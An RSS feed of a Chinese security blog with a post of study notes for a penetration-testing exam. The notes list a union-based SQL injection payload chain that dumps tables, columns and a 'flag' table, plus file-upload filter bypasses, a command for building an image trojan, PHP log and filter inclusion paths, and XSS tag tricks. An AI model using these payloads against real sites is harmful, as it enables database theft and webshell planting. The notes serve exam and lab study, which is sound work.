<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
    <channel>
        <title>PTE学习 on Dan`s Blog</title>
        <link>https://d4n-sec.github.io/tags/pte%E5%AD%A6%E4%B9%A0/</link>
        <description>Recent content in PTE学习 on Dan`s Blog</description>
        <generator>Hugo -- gohugo.io</generator>
        <language>zh-cn</language>
        <copyright>DanSec</copyright>
        <lastBuildDate>Thu, 07 Sep 2023 00:00:00 +0000</lastBuildDate><atom:link href="https://d4n-sec.github.io/tags/pte%E5%AD%A6%E4%B9%A0/index.xml" rel="self" type="application/rss+xml" /><item>
        <title>PTE知识记录</title>
        <link>https://d4n-sec.github.io/p/pte%E7%9F%A5%E8%AF%86%E8%AE%B0%E5%BD%95/</link>
        <pubDate>Thu, 07 Sep 2023 00:00:00 +0000</pubDate>
        
        <guid>https://d4n-sec.github.io/p/pte%E7%9F%A5%E8%AF%86%E8%AE%B0%E5%BD%95/</guid>
        <description>&lt;p&gt;一些详细知识点的备忘&lt;/p&gt;
&lt;h2 id=&#34;sql注入&#34;&gt;SQL注入&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;1.floor类型报错注入，原理是 group by 和 random()相遇时，group by的运行方式发生变化，会两次查询，第一次查询做比较，如果不存在则尝试插入，将第二次查询结果尝试插入，因为random的随机性，第二次插入时的值较第一次发生变化，导致第二次的插入的值其实已经存在，所以报错&lt;code&gt;主键已存在&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;还可以进行的思考：&lt;/p&gt;
&lt;p&gt;group by 为什么要做这样的变化，根据什么判断然后造成的变化，哪些可以造成 group by 运行机制变化&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;联合查询payload&lt;/p&gt;
&lt;blockquote&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39; order by 4 #								#列数为4
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s1&#34;&gt;-1&amp;#39;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;union&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;select&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;4&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;#&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;					&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;#&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;查看回显位&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39; union select 1,database(),3,4 #			#查看数据库
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s1&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s1&#34;&gt;-1&amp;#39;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;union&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;select&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,(&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;select&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;group_concat&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;table_name&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;from&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;information_schema&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;tables&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;where&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;table_schema&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;database&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()),&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;4&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;#&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;				 &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;#&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;查看当前数据库表名&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39; union select 1,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&amp;#39;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;flag&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;),3,4 #
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s1&#34;&gt;											#查看flag表的列名
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s1&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s1&#34;&gt;-1&amp;#39;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;union&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;select&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,(&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;select&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;flag&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;from&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;flag&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;),&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;4&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;#&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;											&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;#&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;带入表名，列名直接查询&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;/blockquote&gt;
&lt;p&gt;空格绕过&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;注释代替空格&lt;/p&gt;
&lt;p&gt;&lt;code&gt;/**/&lt;/code&gt; -&amp;gt; &lt;code&gt; &lt;/code&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;读文件和写文件函数&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;注意有个配置需要打开 &lt;code&gt;secure_file_priv=&#39;&#39;&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;读文件 &lt;code&gt;load_file()&lt;/code&gt;  需要知道绝对路径&lt;/p&gt;
&lt;p&gt;写文件 &lt;code&gt;select 1,&amp;lt;?phpinfo();?&amp;gt; into outfile &amp;quot;C:\\1.txt&amp;quot;&lt;/code&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&#34;文件上传&#34;&gt;文件上传&lt;/h2&gt;
&lt;blockquote&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;绕过类型分白名单和黑名单绕过，尝试大小写，双写？%00截断 &lt;code&gt;.htaccess&lt;/code&gt; &lt;code&gt;.user.ini&lt;/code&gt; 图片马，content-type判断修改&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;windows特性：大小写不敏感，末尾+空格，特殊字符自动去掉&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;末尾带&lt;code&gt;.&lt;/code&gt;：畸形解析？&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;::$DATA ：保存文件时将后面的数据当做文件流处理&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;/blockquote&gt;
&lt;p&gt;.user.ini&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;code&gt;.user.ini&lt;/code&gt; 的作用范围是本目录，子目录无效（测试php版本 5.3.29nts）且&lt;code&gt;.user.ini&lt;/code&gt; 就是php.ini的当前目录下的临时配置（写法规则一样），所以优先级比php.ini高&lt;/p&gt;
&lt;p&gt;CGI程序就是配置了相关路径信息，访问特定URL目录和指定文件后，根据 Shebang 行找到解释器调用解析处理，标准输出接入到socket&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Apache 中的 ScriptAlias /cgi-b/ &amp;ldquo;${SRVROOT}/cgi-bin/&amp;rdquo; 指定了访问URL上的/cgi-b/目录时，会在本地${SRVROOT}/cgi-bin/下查找相应脚本（脚本后缀需要在httpd.conf注册，需要配置 Shebang 行）&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;FastCGI模式（猜测 会预先处理好脚本），运行脚本后不结束运行（CGI每次访问都会fork一次进程）&lt;/p&gt;
&lt;p&gt;还有其他CGI模式&lt;/p&gt;
&lt;p&gt;7.3.4nts 需要重启 才能生效&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;.htaccess&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;利用有条件&lt;/p&gt;
&lt;p&gt;&lt;code&gt;1.mod_rewrite模块开启。&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;2.AllowOverride All&lt;/code&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;构造图片马命令&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;code&gt;copy 1.jpg/a+2.php/b 3.jpg&lt;/code&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;条件竞争&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;先上传再删除（移动，重命名？）&lt;/p&gt;
&lt;p&gt;bp就可以一直上传，然后手动刷新页面访问即可&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;二次渲染&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;上传后的文件重新根据文件大小？图片规则？重新生成图片&lt;/p&gt;
&lt;p&gt;漏洞在于重新生成的部分还是有保留部分源文件，把木马放到没被改变的地方就OK&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&#34;文件包含&#34;&gt;文件包含&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;日志路径：&lt;/p&gt;
&lt;blockquote&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;/var/log/apache2/access.log &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;access_log&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; error.log error_log
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;/var/log/httpd/access.log
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;/var/log/nginx/error.log
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;/blockquote&gt;
&lt;p&gt;伪协议：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;code&gt;php://filter/convert.base64-encode/resource=../file.php&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;php://filter/read=convert.base64-encode/resource=../file.php&lt;/code&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/blockquote&gt;
&lt;p&gt;Python临时http服务&lt;/p&gt;
&lt;blockquote&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;python2 -m SimpleHTTPServer &lt;span class=&#34;m&#34;&gt;8000&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;python3 -m http.server &lt;span class=&#34;m&#34;&gt;9000&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;/blockquote&gt;
&lt;p&gt;可以访问被包含的文件，获得更多信息&lt;/p&gt;
&lt;h2 id=&#34;bp爆破模式&#34;&gt;BP爆破模式&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;sniper:按照字典顺序一个一个参数依次遍历，一个参数遍历完,再遍历下一个参数
battering ram:每个参数同时遍历同一个字典
pitchfork:多个参数同时进行遍历,只是一个选择字典1，一个选择字典2
Clusterbomb:有点像两个嵌套的for循环，参数i和参数j，i=0，然后j要从0-10全部跑完，然后i=1，然后j再从0-10跑完，一对多，多次遍历&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&#34;php标签绕过&#34;&gt;PHP标签绕过&lt;/h2&gt;
&lt;blockquote&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;lt;? echo &amp;#39;123&amp;#39;;?&amp;gt;  #前提是开启配置参数short_open_tags=on
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;lt;?=(表达式)?&amp;gt;  等价于 &amp;lt;?php echo (表达式)?&amp;gt;  #不需要开启参数设置
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;lt;% echo &amp;#39;123&amp;#39;;%&amp;gt;   #开启配置参数asp_tags=on，并且只能在7.0以下版本使用
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;lt;script language=&amp;#34;php&amp;#34;&amp;gt;echo &amp;#39;123&amp;#39;; &amp;lt;/script&amp;gt; #不需要修改参数开关，但是只能在7.0以下可用。
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;lt;?PHP ?&amp;gt; #大写也是可以的，EVAL函数也可以大写
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;/blockquote&gt;
&lt;h2 id=&#34;xss&#34;&gt;XSS&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;code&gt;&amp;lt;script&amp;gt;&lt;/code&gt;标签可以部分大小写，所以可以进行绕过&lt;/p&gt;
&lt;/blockquote&gt;</description>
        </item>
        
    </channel>
</rss>
